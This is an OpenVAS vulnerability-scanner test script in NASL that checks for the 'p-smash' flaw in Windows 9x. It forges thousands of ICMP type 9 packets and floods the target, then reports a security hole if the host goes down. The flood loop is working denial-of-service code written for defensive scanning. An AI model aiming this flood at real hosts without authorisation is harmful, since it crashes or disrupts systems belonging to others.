# OpenVAS Vulnerability Test
# $Id: p-smash.nasl 17 2013-10-27 14:01:43Z jan $
# Description: p-smash DoS (ICMP 9 flood)
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added link to the Microsoft Knowledgebase
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to crash the remote 
machine by flooding it with ICMP type 9 packets.

A cracker may use this attack to make this
host crash continuously, preventing you
from working properly.";

tag_solution = "upgrade your Windows 9x operating system or change it.

Reference : http://support.microsoft.com/default.aspx?scid=KB;en-us;q216141";


# According to "Paulo Ribeiro" <prrar@NITNET.COM.BR> on VULN-DEV,
# Windows 9x cannot handle ICMP type 9 messages.
# This should slow down Windows 95 and crash Windows 98
#

if(description)
{
 script_id(11024);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");
 name = "p-smash DoS (ICMP 9 flood)";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_description(desc);

 summary = "Flood the remote machine with ICMP 9";
 script_summary(summary);

 script_category(ACT_KILL_HOST);

 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";

 script_family(family);

# script_add_preference(name:"Flood length :", 	type:"entry", value:"5000");	
# script_add_preference(name:"Data length :", 	type:"entry", value:"500");	
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#
if(TARGET_IS_IPV6())exit(0);
start_denial();

fl = script_get_preference("Flood length :");
if (! fl) fl = 5000;
dl = script_get_preference("Data length :");
if (! dl) dl = 500;

src = this_host();
dst = get_host_ip();
id = 804;
s = 0;
d = crap(dl);
for (i = 0; i < fl; i = i + 1)
{
 id = id + 1;
 ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off:0,ip_len:20,
                      ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
		      ip_src:this_host());
 icmp = forge_icmp_packet(ip:ip, icmp_type:9, icmp_code:0,
	 		  icmp_seq: s, icmp_id:s, data:d);
 s = s + 1;
 send_packet(icmp, pcap_active: 0);
}

alive = end_denial();
if(!alive){
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}
